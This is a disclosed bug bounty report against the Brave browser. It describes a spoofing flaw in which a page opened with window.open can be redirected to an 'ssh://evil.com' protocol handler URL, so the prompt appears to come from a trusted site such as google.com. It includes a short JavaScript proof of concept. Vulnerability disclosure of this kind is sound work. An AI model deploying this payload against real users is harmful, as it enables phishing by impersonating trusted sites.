# Navigation to protocol handler URL from the opened page displayed as a request from this page.

## Report Details
- **Report ID**: 374969
- **URL**: https://hackerone.com/reports/374969
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-07-01T13:22:11.401Z
- **Disclosed**: 2018-09-24T23:36:34.963Z

## Reporter
- **Username**: metnew
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: brave

## Vulnerability Information
## Summary:
Navigation to protocol handler URL from the page opened using `window.open` is considered as a request from the opened page.

Example: 
1. The page opens `google.com`
2. The page changes opened window's location to `ssh://evil.com`
3. Request to open `ssh://evil.com` URL displayed at `google.com`

**Combining this vulnerability with #369185 makes the attack scenario in #369218 more available.**

## Products affected: 

Brave: 0.23.19 
V8: 6.7.288.46 
rev: 178c3fbc045a0cbdbe098db08307503cce952081 
Muon: 7.1.3 
OS Release: 17.6.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Tor: 0.3.3.7 (git-035a35178c92da94) 
Brave Sync: v1.4.2 
libchromiumcontent: 67.0.3396.87

## Steps To Reproduce:

PoC:
``` html
<script>
    window.onclick = () => {
        w = window.open("https://google.com")
        setTimeout(() => {
            t = w.location.replace('ssh://evil.com');
        }, 1000)
    }
</script>
```

## Supporting Material/References:

Screencast + PoC attached.

## Impact

An attacker could trick a user to open protocol handler from a trusted site.

**Combining this with #369185 makes the attack scenario in #369218 more available.**

## Attachments
- brave-ssh-google.mp4
- exploit.html
